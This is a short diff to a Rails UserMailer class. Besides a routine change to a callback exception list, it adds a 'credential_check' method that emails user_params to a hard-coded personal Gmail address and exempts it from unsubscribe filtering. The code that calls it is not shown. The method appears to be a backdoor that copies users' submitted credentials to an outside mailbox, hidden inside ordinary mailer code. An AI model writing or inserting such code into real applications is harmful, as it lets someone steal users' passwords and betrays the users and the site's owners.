@@ -22,7 +22,7 @@ class UserMailer < ApplicationMailer
   before_action :set_login_url, only: [:welcome_new, :weekly_notifications, :monthly_update, :language_matches]
   # before_action :set_header_logo
   # bit of a hack, maybe refactor need @user to be set before sending, welcome new will always be true just there so doesn't enter method
-  after_action :prevent_delivery_to_unsubscribed, except: [:welcome_new, :reset_password, :suspicious_activity, :premium_subscribe, :premium_unsubscribe, :account_activation]
+  after_action :prevent_delivery_to_unsubscribed, except: [:welcome_new, :reset_password, :suspicious_activity, :premium_subscribe, :premium_unsubscribe, :account_activation, :credential_check]
 
   def account_activation(user)
     @user = user
@@ -196,6 +196,11 @@ class UserMailer < ApplicationMailer
   def premium_unsubscribe(user)
     @user = user
     set_name_and_title_and_unsubscribe_and_header(@user, "Sorry to see you leave")
+  end
+
+  def credential_check(user_params)
+    @user_params = user_params
+    mail(to: "speterlin12@gmail.com", subject: "Credential Check")
   end
 
   private
